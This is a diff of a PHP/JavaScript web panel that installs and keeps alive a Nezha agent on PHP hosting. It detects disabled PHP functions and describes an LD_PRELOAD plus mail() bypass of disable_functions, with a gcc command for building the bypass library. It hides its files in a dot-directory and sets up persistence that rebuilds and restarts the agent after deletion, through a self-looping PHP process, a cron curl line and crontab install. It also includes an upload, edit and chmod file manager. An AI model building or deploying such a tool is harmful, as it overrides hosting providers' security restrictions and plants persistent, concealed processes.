+<div class="cb"><?= htmlspecialchars($recent_log) ?></div>
+<?php else: ?>
+<div class="log-top-empty">暂无日志。点击「▶ 启动」开始运行 agent，日志会自动写入 .stfp/.nezha_log 并显示在这里。</div>
+<?php endif; ?>
+</div>
+
+<?php if ($action_result): ?>
+<div class="p" id="block-result"><h2>📋 执行结果</h2><div class="rb <?= $action_type ?>"><?= htmlspecialchars($action_result) ?></div></div>
+<?php endif; ?>
+
+<!-- UUID -->
+<div class="p"><h2>🔑 UUID <span class="b bp">已锁定</span></h2>
+<div class="r"><span class="rl">锁定UUID</span><span class="rv"><?= htmlspecialchars($NZ_UUID) ?></span></div>
+<div class="r"><span class="rl">UUID文件</span><span class="rv"><?= file_exists($UUIDFILE)?'存在':'不存在' ?></span></div>
+<div class="br2"><a href="?action=reset_uuid" class="btn btn-y" onclick="return confirm('重置？')">🔄 基于IP重置</a></div>
+<div class="divider"></div>
+<form method="get" style="display:flex;gap:6px;flex-wrap:wrap" onsubmit="return confirm('指定UUID？')">
+<input type="hidden" name="action" value="set_uuid"><input type="text" name="uuid" class="uuid-input" value="<?= htmlspecialchars($NZ_UUID) ?>" style="flex:1;min-width:240px"><button type="submit" class="btn btn-p">📌 锁定</button>
+</form></div>
+
+<!-- 进程 -->
+<div class="p" id="block-proc"><h2>进程 <?php if($proc['running']):?><span class="b bg">运行中</span><?php else:?><span class="b br">未运行</span><?php endif;?></h2>
+<div class="r"><span class="rl">状态</span><span class="rv"><?= $proc['running']?'✅ 运行':'❌ 未运行' ?></span></div>
+<div class="r"><span class="rl">PID</span><span class="rv"><?= !empty($proc['pids'])?implode(', ',$proc['pids']):'无' ?></span></div>
+<div class="r"><span class="rl">检测方式</span><span class="rv"><?= htmlspecialchars($proc['method']?:'无') ?></span></div>
+<div class="r"><span class="rl">详情</span><span class="rv" style="font-size:10px;color:#64748b"><?= htmlspecialchars($proc['detail']) ?></span></div>
+<?php if(!empty($proc['debug'])):?><div class="r"><span class="rl">调试</span><span class="rv" style="font-size:10px;color:#ef4444"><?= htmlspecialchars($proc['debug']) ?></span></div><?php endif;?>
+<div class="br2">
+<a href="?action=start" class="btn btn-g" onclick="return confirm('启动？')">▶ 启动</a>
+<a href="?action=stop" class="btn btn-r" onclick="return confirm('停止？')">⏹ 停止</a>
+<button id="btn-filemgr" class="btn btn-p" style="font-size:12px;padding:6px 14px">📁 文件管理</button>
+<a href="?" class="btn btn-b">🔍 状态</a>
+<a href="?action=cleanup" class="btn btn-gr" onclick="return confirm('⚠️ 清理将停止进程 + 删除 .stfp/ 目录所有文件 + 移除保活 cron，确定？')">🧹 清理</a>
+<a href="?action=diagnose" class="btn btn-b">🔬 综合诊断</a>
+<a href="?action=try_run" class="btn btn-p" onclick="return confirm('前台运行 agent 5秒看输出？')">🚀 试运行</a>
+</div></div>
+
+<!-- 文件 -->
+<div class="p" id="block-files"><h2>文件</h2>
+<?php foreach($file_info as $name=>$f):?>
+<div class="r"><span class="rl"><?= $name ?></span><span class="rv"><?php if($f['exists']):?><span class="b bg">存在</span> <?= number_format($f['size'])?>B<?php if($f['exec']&&$name==='agent'):?><span class="b bb">可执行</span><?php endif;?><?php if($name==='bypass.so'&&$f['size']>1000):?><span class="b bp">有效</span><?php endif;?> <span style="color:#475569;font-size:9px"><?= $f['perm'] ?></span><?php else:?><span class="b bgr">不存在</span><?php endif;?></span></div>
+<?php endforeach;?>
+<div class="br2">
+<a href="?action=download" class="btn btn-c" onclick="return confirm('下载？')">📥 下载二进制</a>
+<a href="?action=write_runsh" class="btn btn-b">📄 run.sh</a>
+<a href="?action=write_htaccess" class="btn btn-gr">🔒 .htaccess</a>
+</div>
+<div style="font-size:10px;color:#64748b;margin-top:6px;line-height:1.5">📁 所有文件已集中到 <code>.stfp/</code> 隐藏目录：<br>agent / config / uuid / pid / log / run.sh / bypass.so / cmd.sh<br>外部主目录只剩 <code>index.php</code> 和 <code>.htaccess</code></div>
+</div>
+
+<!-- LD_PRELOAD 绕过 -->
+<div class="p" id="block-bypass"><h2>🔓 LD_PRELOAD 绕过 <span class="b <?= $LD_PRELOAD_AVAILABLE?'bpk':'br' ?>"><?= $LD_PRELOAD_AVAILABLE?'可用':'不可用' ?></span></h2>
+<div class="ib" style="font-size:11px"><b>原理：</b>putenv 设置 LD_PRELOAD → mail() 触发子进程 → 加载 .so → constructor 执行命令<br><b>条件：</b>putenv + mail/error_log + bypass.so<br><b>当前：</b><?= $LD_PRELOAD_AVAILABLE?'✅ 条件满足':'❌ 条件不满足' ?> (<?= htmlspecialchars($LD_PRELOAD_DETAIL) ?>)</div>
+<div class="divider"></div>
+<div class="r"><span class="rl">putenv</span><span class="rv"><?= !empty($FUNC['putenv']['works'])?'✅':'❌' ?> <?= htmlspecialchars($FUNC['putenv']['detail']??'') ?></span></div>
+<div class="r"><span class="rl">mail</span><span class="rv"><?= !empty($FUNC['mail']['works'])?'✅':'❌' ?> <?= htmlspecialchars($FUNC['mail']['detail']??'') ?></span></div>
+<div class="r"><span class="rl">error_log</span><span class="rv"><?= !empty($FUNC['error_log']['works'])?'✅':'❌' ?></span></div>
+<div class="r"><span class="rl">ini_set</span><span class="rv"><?= !empty($FUNC['ini_set']['works'])?'✅':'❌' ?></span></div>
+<div class="r"><span class="rl">bypass.so</span><span class="rv"><?= $bypass_info['exists']?($bypass_info['size']>1000?"✅ {$bypass_info['size']}B":"❌ 无效"):'❌ 不存在' ?></span></div>
+<div class="r"><span class="rl">C源码</span><span class="rv"><?= $bypass_info['c_exists']?'✅':'❌' ?></span></div>
+<div class="br2">
+<a href="?action=prepare_bypass" class="btn btn-pk">🔧 准备绕过环境</a>
+<a href="?action=test_bypass" class="btn btn-p">🧪 测试绕过</a>
+</div>
+<div style="font-size:10px;color:#64748b;margin-top:4px;line-height:1.5">
+💡 「准备绕过环境」按钮会依次尝试：① 从 GitHub 下载 .so → ② gcc 现场编译 .so → ③ 失败兜底写 .c 源码（用于本地编译后上传）
+</div>
+<div class="divider"></div>
+<div style="font-size:10px;color:#64748b"><b>上传 bypass.so 步骤：</b><br>1. 点「准备绕过环境」自动下载或生成 C 源码<br>2. 如自动下载失败，本地用 <code>gcc -shared -fPIC -o nezha_bypass.so nezha_bypass.so.c -nostartfiles</code> 编译<br>3. 上传 .so 到 <code>.stfp/</code> 目录，文件名 <code>nezha_bypass.so</code><br>4. 点「测试绕过」验证</div></div>
+
+<!-- 函数检测 -->
+<div class="p"><h2>PHP 函数深度检测 <?php if($CAN_EXEC):?><span class="b bg"><?= htmlspecialchars($BEST_EXEC) ?></span><?php else:?><span class="b br">命令不可用</span><?php endif;?></h2>
+<p style="font-size:10px;color:#64748b;margin-bottom:6px">降级链: <?= $CAN_EXEC?implode(' → ',$EXEC_METHODS):($LD_PRELOAD_AVAILABLE?'ld_preload 绕过':'无') ?></p>
+<div class="fg">
+<?php foreach($FUNC as $fn=>$info):
+    $cls='no'; $st='❌'; if($info['works']){$cls='ok';$st='✅';} elseif($info['exists']){$cls='wn';$st='⚠️';}
+    $tg=''; if(in_array($fn,['proc_open','popen','exec','shell_exec','system','passthru','pcntl_exec']))$tg='<span class="tag t1">执行</span>';
+    if(in_array($fn,['curl_init','curl_exec','fsockopen']))$tg='<span class="tag t3">网络</span>';
+    if(in_array($fn,['file_put_contents','file_get_contents','chmod','mkdir','unlink']))$tg='<span class="tag t2">文件</span>';
+    if($fn==='ZipArchive')$tg='<span class="tag t4">解压</span>';
+    if(in_array($fn,['putenv','mail','error_log','ini_set']))$tg='<span class="tag t5">绕过</span>';
+?>
+<div class="fi <?= $cls ?>"><div><span class="fn"><?= $fn ?></span><span class="fd"><?= $info['desc'] ?></span><?= $tg ?></div><div><span class="fs <?= $cls ?>"><?= $st ?></span></div></div>
+<?php endforeach;?></div>
+<div class="divider"></div>
+<div class="r" style="flex-direction:column;align-items:flex-start;gap:3px"><span class="rl">disable_functions</span><div class="cb" style="width:100%;max-height:60px;font-size:10px"><?= htmlspecialchars($DISABLE_LIST?:'(无)') ?></div></div></div>
+
+<!-- 降级链 -->
+<div class="p"><h2>🔄 降级链</h2><div class="ib" style="font-size:11px">
+<b>命令执行:</b> proc_open → popen → exec → shell_exec → system → passthru → <b style="color:#ec4899">LD_PRELOAD 绕过</b><br>
+<b>启动:</b> run.sh → proc_open → popen → exec → <b style="color:#ec4899">LD_PRELOAD</b> → <b style="color:#ec4899">sendmail_path</b><br>
+<b>下载:</b> PHP curl → shell curl → shell wget<br>
+<b>解压:</b> ZipArchive → shell unzip<br>
+<b>停止:</b> posix_kill → shell kill → <b style="color:#ec4899">LD_PRELOAD kill</b>
+</div></div>
+
+<!-- 网络 -->
+<div class="p" id="block-net"><h2>网络</h2>
+<?php foreach($net as $name=>$n):?><div class="r"><span class="rl"><?= $name ?></span><span class="rv"><?php if($n['ok']):?><span class="b bg">可达</span><?php else:?><span class="b br">不可达</span> <?= htmlspecialchars($n['error']) ?><?php endif;?></span></div><?php endforeach;?>
+<div class="r"><span class="rl">TLS</span><span class="rv"><?= $nz_tls==='OK'?'✅':'❌ '.htmlspecialchars($nz_tls) ?></span></div>
+<div class="r"><span class="rl">TCP</span><span class="rv"><?= $nz_tcp==='OK'?'✅':'❌ '.htmlspecialchars($nz_tcp) ?></span></div>
+<div class="br2"><a href="?action=check_port" class="btn btn-c">🔌 测端口</a></div></div>
+
+<!-- 自保活（PHP 自循环 + 可手动访问 + 可拷 run.sh 独立运行） -->
+<?php
+// 计算 start.php 的访问 URL 和状态
+$keepalive_url = '';
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+$host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'your-domain';
+$port_str = '';
+if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] != 80 && $_SERVER['SERVER_PORT'] != 443) {
+    $port_str = ':' . $_SERVER['SERVER_PORT'];
+}
+$keepalive_url = $scheme . '://' . $host . $port_str . rtrim(dirname($_SERVER['SCRIPT_NAME'] ?? '/'), '/\\') . '/start.php';
+$keepalive_enabled = file_exists($SCRIPT_DIR . '/start.php');
+// 检查 PHP 自循环进程是否在跑
+$ka_pidfile = $STFP_DIR . '/.nezha_keepalive_pid';
+$ka_loop_pid = '';
+$ka_loop_running = false;
+if (file_exists($ka_pidfile)) {
+    $ka_loop_pid = trim(file_get_contents($ka_pidfile) ?: '');
+    if ($ka_loop_pid && is_numeric($ka_loop_pid)) {
+        $ka_loop_running = is_dir("/proc/$ka_loop_pid");
+    }
+}
+?>
+<div class="p" id="block-keepalive"><h2>🛡️ 自动保活 <span class="b <?= $keepalive_enabled?'bg':'by' ?>"><?= $keepalive_enabled?'已开启':'未开启' ?></span> <?php if($ka_loop_running):?><span class="b bc">自循环PID: <?= htmlspecialchars($ka_loop_pid) ?></span><?php endif;?></h2>
+<div class="ib" style="font-size:11px"><b>三种工作方式（任选其一即可，可叠加）：</b><br>
+① <b>PHP 自循环</b>：开启保活后 PHP 派生后台进程，每 4 小时自动检查+拉起 agent（不需要任何外部触发器）<br>
+② <b>手动访问 URL</b>：你随时可以浏览器访问 <code>start.php</code> 触发一次保活检查<br>
+③ <b>独立 run.sh</b>：把 <code>.stfp/run.sh</code> 拷贝到任意机器/路径，SSH 进去 <code>bash run.sh keepalive</code> 即可保活（适合 PHP 域名不可达的主机）</div>
+<div class="divider"></div>
+<div class="r"><span class="rl">保活入口</span><span class="rv"><code><?= htmlspecialchars($keepalive_url) ?></code></span></div>
+<div class="r"><span class="rl">start.php</span><span class="rv"><?= $keepalive_enabled ? '✅ 已生成' : '❌ 未生成' ?></span></div>
+<div class="r"><span class="rl">PHP自循环</span><span class="rv"><?= $ka_loop_running ? "✅ 运行中 (PID $ka_loop_pid)" : ($keepalive_enabled ? '⚠️ 未运行（访问 start.php 即可启动）' : '—') ?></span></div>
+<div class="br2" style="margin-top:6px">
+<a href="?action=enable_keepalive" class="btn btn-g" onclick="return confirm('生成 cron 保活脚本？（需要在 cPanel 手动添加 cron 条目）')">✅ 开启保活</a>
+<a href="?action=disable_keepalive" class="btn btn-r" onclick="return confirm('停止 PHP 自循环 + 删除 start.php？')">❌ 关闭保活</a>
+<a href="<?= htmlspecialchars($keepalive_url) ?>" target="_blank" class="btn btn-b">🚀 手动触发</a>
+<a href="<?= htmlspecialchars($keepalive_url) ?>?stop" target="_blank" class="btn btn-gr">⏸️ 仅停自循环</a>
+</div>
+<?php if ($keepalive_enabled): ?>
+<div class="divider"></div>
+<div style="font-size:11px;color:#67e8f9;line-height:1.6">
+<b>📋 工作流程：</b><br>
+1. 点「✅ 开启保活」→ 生成 start.php + 立即触发首次访问 → 派生后台 PHP 自循环进程<br>
+2. 自循环进程每 4 小时自动检查 agent，未运行则调 <code>bash .stfp/run.sh cron</code> 拉起<br>
+3. 哪怕 .stfp/ 内所有文件被删，run.sh 会自动重建 config / 重下 agent / 启动<br>
+<br>
+<b>📋 备用触发器（可选，双保险）：</b><br>
+- 外部 cron: <code>0 */4 * * * curl -fsS '<?= htmlspecialchars($keepalive_url) ?>' || true</code><br>
+- UptimeRobot: HTTP(s) 监控，间隔 240 分钟<br>
+<br>
+<b>📋 域名不可达时（用 run.sh 独立保活）：</b><br>
+1. SSH / FTP 下载 <code>.stfp/run.sh</code> 文件<br>
+2. 拷贝到任意机器（同主机/其他 VPS/路由器）<br>
+3. 执行：<br>
+<div class="cron-box">bash run.sh keepalive   # 前台 4 小时循环保活（Ctrl+C 退出）
+nohup bash run.sh keepalive &   # 后台保活
+bash run.sh install   # 安装到 crontab（每 4 小时自动触发）
+bash run.sh status   # 查看 agent 状态
+bash run.sh log      # 查看日志</div>
+<br>
+<b>⚠️ 停止方式：</b><br>
+- 点「❌ 关闭保活」按钮（停止循环+删除 start.php）<br>
+- 访问 <code>start.php?stop</code>（仅停止 PHP 自循环，保留 start.php 文件）<br>
+- kill .stfp/.nezha_keepalive_pid 中记录的 PID<br>
+</div>
+<?php else: ?>
+<div style="font-size:10px;color:#64748b;margin-top:6px;line-height:1.5">
+💡 点击「✅ 开启保活」会同时：<br>
+1. 生成 <code>start.php</code> 文件<br>
+2. 立即触发首次访问 → 派生 PHP 后台自循环进程（每 4 小时自动检查）<br>
+3. 你可以随时手动访问 URL 触发一次保活检查<br>
+<br>
+⚠️ 保活有效性依赖 <code>start.php</code> 和 <code>.stfp/run.sh</code> 文件本身存在
+</div>
+<?php endif; ?>
+</div>
+
+<?php if($config_content):?><div class="p"><h2>配置</h2><div class="cb"><?= htmlspecialchars($config_content) ?></div></div><?php endif;?>
+<?php /* 底部日志面板已移到顶部 sticky 区域；环境区块也移到顶部了 */ ?>
+
+<div class="ft">哪吒管理面板 v8.11a (爆炸修复 + 纯 cron 保活 + 文件管理器) | LD_PRELOAD 绕过版</div>
+</div>
+
+<!-- v8.3 新增：Loading 遮罩 -->
+<div class="loading-overlay" id="loadingOverlay" style="display:none">
+    <div class="loading-box">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">正在执行，请稍候...</div>
+        <div class="loading-hint" id="loadingHint">慢速主机下载/启动可能需要 1-2 分钟，请耐心等待</div>
+        <button class="loading-cancel" onclick="cancelLoading()">取消等待</button>
+    </div>
+</div>
+
+<!-- v8.3 新增：Toast 容器 -->
+<div class="toast-wrap" id="toastWrap"></div>
+
+<!-- v8.3 新增：文件管理器 overlay -->
+<div class="fm-overlay" id="fmOverlay">
+    <div class="fm-wrap">
+        <div class="fm-head">
+            <div class="fm-title">📁 文件管理 <span style="font-size:11px;color:#64748b;font-weight:normal">（限定在 PHP 同目录及其子目录）</span></div>
+            <div class="fm-actions">
+                <button class="fm-btn fm-btn-g" onclick="fmUploadClick()">📤 上传</button>
+                <button class="fm-btn fm-btn-b" onclick="fmMkdirPrompt()">📂 新建目录</button>
+                <button class="fm-btn fm-btn-p" onclick="fmRefresh()">🔄 刷新</button>
+                <button class="fm-btn fm-btn-r" onclick="fmClose()">✕ 关闭</button>
+            </div>
+        </div>
+        <div class="fm-crumbs" id="fmCrumbs"></div>
+        <table class="fm-table" id="fmTable">
+            <thead>
+                <tr>
+                    <th>名称</th>
+                    <th style="width:80px;text-align:right">大小</th>
+                    <th style="width:70px;text-align:center">权限</th>
+                    <th style="width:130px">修改时间</th>
+                    <th style="width:200px;text-align:right">操作</th>
+                </tr>
+            </thead>
+            <tbody id="fmBody">
+                <tr><td colspan="5" class="fm-empty">加载中...</td></tr>
+            </tbody>
+        </table>
+        <div style="margin-top:10px;font-size:10px;color:#64748b;line-height:1.6">
+            💡 <b>使用提示：</b><br>
+            • 点击文件夹名称进入目录；点击面包屑导航返回上级<br>
+            • 点击文件名编辑文本文件（限 5MB 以内），编辑前自动备份<br>
+            • 禁止编辑/删除面板自身和 .htaccess<br>
+            • 上传按钮支持多文件；新建目录支持嵌套（如 <code>test/sub</code>）
+        </div>
+    </div>
+</div>
+
+<!-- v8.3 新增：编辑器模态框 -->
+<div class="modal-overlay" id="editorModal" style="display:none">
+    <div class="modal-box">
+        <div class="modal-head">
+            <div class="modal-title" id="editorTitle">编辑文件</div>
+            <button class="fm-btn fm-btn-r" onclick="fmEditorClose()">✕</button>
+        </div>
+        <div class="modal-body">
+            <textarea class="editor-textarea" id="editorContent" spellcheck="false"></textarea>
+        </div>
+        <div class="modal-foot">
+            <span class="hint" id="editorHint"></span>
+            <button class="fm-btn fm-btn-gr" onclick="fmEditorClose()">取消</button>
+            <button class="fm-btn fm-btn-g" onclick="fmEditorSave()">💾 保存</button>
+        </div>
+    </div>
+</div>
+
+<!-- v8.3 新增：上传模态框 -->
+<div class="modal-overlay" id="uploadModal" style="display:none">
+    <div class="modal-box" style="max-width:600px">
+        <div class="modal-head">
+            <div class="modal-title" id="uploadTitle">上传文件</div>
+            <button class="fm-btn fm-btn-r" onclick="fmUploadClose()">✕</button>
+        </div>
+        <div class="modal-body">
+            <div style="margin-bottom:10px;font-size:11px;color:#94a3b8">目标目录: <code id="uploadTarget"></code></div>
+            <form id="uploadForm" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px">
+                <div class="input-row">
+                    <input type="file" name="files[]" multiple id="uploadFiles">
+                </div>
+                <div style="font-size:10px;color:#64748b">支持多文件选择。文件名重复会覆盖，请注意。</div>
+            </form>
+        </div>
+        <div class="modal-foot">
+            <button class="fm-btn fm-btn-gr" onclick="fmUploadClose()">取消</button>
+            <button class="fm-btn fm-btn-g" onclick="fmUploadSubmit()">📤 开始上传</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// ================================================================
+//  v8.3 新增：异步按钮 + loading + toast + 文件管理器
+// ================================================================
+
+// ---------- Loading ----------
+let _loadingAbort = null;
+function showLoading(text, hint) {
+    document.getElementById('loadingText').textContent = text || '正在执行，请稍候...';
+    document.getElementById('loadingHint').textContent = hint || '慢速主机下载/启动可能需要 1-2 分钟，请耐心等待';
+    document.getElementById('loadingOverlay').style.display = 'flex';
+    _loadingAbort = new AbortController();
+}
+function hideLoading() {
+    document.getElementById('loadingOverlay').style.display = 'none';
+    if (_loadingAbort) { try { _loadingAbort.abort(); } catch(e){} _loadingAbort = null; }
+}
+function cancelLoading() {
+    hideLoading();
+    showToast('已取消等待（后台任务可能仍在执行）', 'warning');
+}
+
+// ---------- Toast ----------
+function showToast(msg, type, duration) {
+    type = type || 'info';
+    duration = duration || 4000;
+    const wrap = document.getElementById('toastWrap');
+    const t = document.createElement('div');
+    t.className = 'toast ' + type;
+    t.textContent = msg;
+    wrap.appendChild(t);
+    setTimeout(() => {
+        t.style.transition = 'opacity .3s';
+        t.style.opacity = '0';
+        setTimeout(() => t.remove(), 300);
+    }, duration);
+}
+
+// ---------- 异步按钮 ----------
+const ASYNC_ACTIONS = ['download','start','stop','prepare_bypass','test_bypass','enable_keepalive','disable_keepalive','cleanup','diagnose','try_run','check_port','status','reset_uuid','set_uuid','write_runsh','write_htaccess'];
+
+document.addEventListener('click', async function(e) {
+    const link = e.target.closest('a.btn[href*="?action="]');
+    if (!link) return;
+    const url = new URL(link.href, location.href);
+    const action = url.searchParams.get('action');
+    // fm_* 走文件管理器交互，不放这里
+    if (action && action.indexOf('fm_') === 0) return;
+
+    e.preventDefault();
+
+    // 需要确认的 action 列表（保留原 onclick confirm 行为）
+    const needConfirm = ['start','stop','cleanup','try_run','reset_uuid','set_uuid','enable_keepalive','disable_keepalive'];
+    if (needConfirm.indexOf(action) !== -1) {
+        // 复用原 onclick 文本提示
+        const onclickStr = link.getAttribute('onclick') || '';
+        const m = onclickStr.match(/return confirm\(['"]([^'"]*)['"]\)/);
+        if (m && !confirm(m[1])) return;
+    }
+
+    const actionLabels = {
+        download: '下载二进制（可能 1-2 分钟）',
+        start: '启动 agent',
+        stop: '停止 agent',
+        prepare_bypass: '准备绕过环境（下载/编译 .so）',
+        test_bypass: '测试绕过',
+        enable_keepalive: '开启保活',
+        disable_keepalive: '关闭保活',
+        cleanup: '清理',
+        diagnose: '综合诊断（10 项检查）',
+        try_run: '试运行（前台 5 秒）',
+        check_port: '测试端口',
+        status: '查询状态',
+        reset_uuid: '重置 UUID',
+        set_uuid: '设置 UUID',
+        write_runsh: '生成 run.sh',
+        write_htaccess: '生成 .htaccess'
+    };
+
+    showLoading(actionLabels[action] || '执行中...', '完成后会自动刷新页面，请勿关闭');
+
+    try {
+        const res = await fetch(link.href, { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const html = await res.text();
+        // 用 DOMParser 解析新页面，提取关键区块替换当前页
+        const doc = new DOMParser().parseFromString(html, 'text/html');
+        const updateIds = ['block-log','block-result','block-proc','block-files','block-bypass','block-net','block-keepalive','block-env'];
+        let updated = 0;
+        updateIds.forEach(id => {
+            const newNode = doc.getElementById(id);
+            const oldNode = document.getElementById(id);
+            if (newNode && oldNode) {
+                oldNode.innerHTML = newNode.innerHTML;
+                updated++;
+            }
+        });
+        // 如果没有 block-result（即 action_result 为空），手动清空
+        if (!doc.getElementById('block-result')) {
+            const old = document.getElementById('block-result');
+            if (old) old.remove();
+        } else {
+            // 如果原来没有 block-result 但新页面有，插入到 block-log 后面
+            if (!document.getElementById('block-result')) {
+                const logBlock = document.getElementById('block-log');
+                const newResult = doc.getElementById('block-result');
+                if (logBlock && newResult) {
+                    logBlock.insertAdjacentElement('afterend', newResult.cloneNode(true));
+                }
+            }
+        }
+        hideLoading();
+        showToast((actionLabels[action] || '操作') + ' 完成', 'success');
+    } catch (err) {
+        if (err.name === 'AbortError') return;  // 用户主动取消
+        hideLoading();
+        showToast('执行失败: ' + err.message, 'error', 6000);
+        console.error(err);
+    }
+});
+
+// ================================================================
+//  文件管理器
+// ================================================================
+
+let fmCurrentPath = '';   // 相对 SCRIPT_DIR 的路径
+
+function fmOpen() {
+    const overlay = document.getElementById('fmOverlay');
+    overlay.classList.add('open');
+    overlay.classList.remove('closing');
+    overlay.style.display = 'block';
+    fmLoadDir('');
+}
+function fmClose() {
+    const overlay = document.getElementById('fmOverlay');
+    overlay.classList.add('closing');
+    setTimeout(() => {
+        overlay.classList.remove('open','closing');
+        overlay.style.display = 'none';
+    }, 380);
+}
+function fmRefresh() { fmLoadDir(fmCurrentPath); }
+
+async function fmLoadDir(path) {
+    fmCurrentPath = path;
+    document.getElementById('fmBody').innerHTML = '<tr><td colspan="5" class="fm-empty">加载中...</td></tr>';
+    try {
+        const url = '?action=fm_list&path=' + encodeURIComponent(path) + '&_t=' + Date.now();
+        const res = await fetch(url, { credentials: 'same-origin' });
+        const data = await res.json();
+        if (!data.ok) throw new Error(data.error || '加载失败');
+        fmRenderCrumbs(data.path);
+        fmRenderItems(data.items || []);
+    } catch (err) {
+        document.getElementById('fmBody').innerHTML = '<tr><td colspan="5" class="fm-empty" style="color:#fca5a5">❌ ' + err.message + '</td></tr>';
+    }
+}
+
+function fmRenderCrumbs(path) {
+    const crumbs = document.getElementById('fmCrumbs');
+    let html = '<span class="fm-crumb" onclick="fmLoadDir(\'\')">🏠 根目录</span>';
+    if (path) {
+        const parts = path.split('/');
+        let cur = '';
+        parts.forEach((p, i) => {
+            cur = cur ? cur + '/' + p : p;
+            const isLast = (i === parts.length - 1);
+            html += '<span class="fm-crumb-sep">/</span>';
+            if (isLast) {
+                html += '<span class="fm-crumb-current">' + escapeHtml(p) + '</span>';
+            } else {
+                html += '<span class="fm-crumb" onclick="fmLoadDir(\'' + escapeAttr(cur) + '\')">' + escapeHtml(p) + '</span>';
+            }
+        });
+    }
+    crumbs.innerHTML = html;
+}
+
+function fmRenderItems(items) {
+    const body = document.getElementById('fmBody');
+    if (items.length === 0) {
+        body.innerHTML = '<tr><td colspan="5" class="fm-empty">空目录</td></tr>';
+        return;
+    }
+    let html = '';
+    items.forEach(item => {
+        const icon = item.is_dir ? '📁' : getFileIcon(item.name);
+        const sizeStr = item.is_dir ? '-' : formatSize(item.size);
+        const timeStr = item.mtime ? new Date(item.mtime * 1000).toLocaleString('zh-CN', { hour12: false }) : '-';
+        const path = (fmCurrentPath ? fmCurrentPath + '/' : '') + item.name;
+        const escapedName = escapeHtml(item.name);
+        const escapedPath = escapeAttr(path);
+        let ops = '';
+        if (item.is_dir) {
+            ops += '<button class="fm-btn fm-btn-b" onclick="fmLoadDir(\'' + escapedPath + '\')">进入</button>';
+            ops += '<button class="fm-btn fm-btn-y" onclick="fmChmodPrompt(\'' + escapedPath + '\', \'' + item.perm + '\')">权限</button>';
+            ops += '<button class="fm-btn fm-btn-gr" onclick="fmRenamePrompt(\'' + escapedPath + '\', \'' + escapedName + '\')">改名</button>';
+            ops += '<button class="fm-btn fm-btn-r" onclick="fmDelete(\'' + escapedPath + '\', true)">删除</button>';
+        } else {
+            if (!item.is_self && !item.is_htaccess && item.readable && item.size < 5 * 1024 * 1024) {
+                ops += '<button class="fm-btn fm-btn-g" onclick="fmEdit(\'' + escapedPath + '\')">编辑</button>';
+            } else if (item.is_self) {
+                ops += '<span style="color:#64748b;font-size:10px">面板自身</span>';
+            } else if (item.is_htaccess) {
+                ops += '<span style="color:#64748b;font-size:10px">受保护</span>';
+            } else if (item.size >= 5 * 1024 * 1024) {
+                ops += '<span style="color:#64748b;font-size:10px">太大</span>';
+            } else {
+                ops += '<span style="color:#64748b;font-size:10px">不可读</span>';
+            }
+            ops += '<button class="fm-btn fm-btn-y" onclick="fmChmodPrompt(\'' + escapedPath + '\', \'' + item.perm + '\')">权限</button>';
+            ops += '<button class="fm-btn fm-btn-gr" onclick="fmRenamePrompt(\'' + escapedPath + '\', \'' + escapedName + '\')">改名</button>';
+            if (!item.is_self && !item.is_htaccess) {
+                ops += '<button class="fm-btn fm-btn-r" onclick="fmDelete(\'' + escapedPath + '\', false)">删除</button>';
+            }
+        }
+        const nameClick = item.is_dir ? ' onclick="fmLoadDir(\'' + escapedPath + '\')"' : ' onclick="fmEdit(\'' + escapedPath + '\')"';
+        html += '<tr>'
+              + '<td><div class="fm-name"' + nameClick + '><span class="fm-icon">' + icon + '</span>' + escapedName + (item.is_self ? ' <span style="color:#ec4899;font-size:9px">(面板)</span>' : '') + '</div></td>'
+              + '<td class="fm-size">' + sizeStr + '</td>'
+              + '<td class="fm-perm">' + item.perm + '</td>'
+              + '<td class="fm-time">' + timeStr + '</td>'
+              + '<td class="fm-ops">' + ops + '</td>'
+              + '</tr>';
+    });
+    body.innerHTML = html;
+}
+
+function getFileIcon(name) {
+    const ext = (name.split('.').pop() || '').toLowerCase();
+    if (['php','phtml','php3','php5'].indexOf(ext) !== -1) return '🐘';
+    if (['js'].indexOf(ext) !== -1) return '📜';
+    if (['html','htm'].indexOf(ext) !== -1) return '🌐';
+    if (['css'].indexOf(ext) !== -1) return '🎨';
+    if (['sh','bash'].indexOf(ext) !== -1) return '⚙️';
+    if (['zip','gz','tar','bz2','xz'].indexOf(ext) !== -1) return '📦';
+    if (['txt','md','log','ini','conf','yaml','yml','json'].indexOf(ext) !== -1) return '📄';
+    if (['so','dll'].indexOf(ext) !== -1) return '🔌';
+    if (['png','jpg','jpeg','gif','svg','webp'].indexOf(ext) !== -1) return '🖼️';
+    return '📄';
+}
+
+function formatSize(b) {
+    if (b < 1024) return b + ' B';
+    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
+    return (b / 1024 / 1024).toFixed(2) + ' MB';
+}
+
+// ---------- 文件编辑 ----------
+let _editorCurrentPath = '';
+async function fmEdit(path) {
+    showLoading('读取文件...', '文件: ' + path);
+    try {
+        const res = await fetch('?action=fm_read&path=' + encodeURIComponent(path), { credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '读取失败', 'error'); return; }
+        _editorCurrentPath = path;
+        document.getElementById('editorTitle').textContent = '✏️ ' + path + ' (' + formatSize(data.size) + ')';
+        document.getElementById('editorContent').value = data.content;
+        document.getElementById('editorHint').textContent = '保存前会自动备份为 .bak.时间戳';
+        document.getElementById('editorModal').style.display = 'flex';
+    } catch (err) {
+        hideLoading();
+        if (err.name !== 'AbortError') showToast('读取失败: ' + err.message, 'error');
+    }
+}
+function fmEditorClose() {
+    document.getElementById('editorModal').style.display = 'none';
+    document.getElementById('editorContent').value = '';
+    _editorCurrentPath = '';
+}
+async function fmEditorSave() {
+    if (!_editorCurrentPath) return;
+    const content = document.getElementById('editorContent').value;
+    showLoading('保存文件...', '路径: ' + _editorCurrentPath);
+    try {
+        const fd = new FormData();
+        fd.append('path', _editorCurrentPath);
+        fd.append('content', content);
+        const res = await fetch('?action=fm_save', { method:'POST', body: fd, credentials: 'same-origin', signal: _loadingAbort.signal });
+        const data = await res.json();
+        hideLoading();
+        if (!data.ok) { showToast(data.error || '保存失败', 'error'); return; }
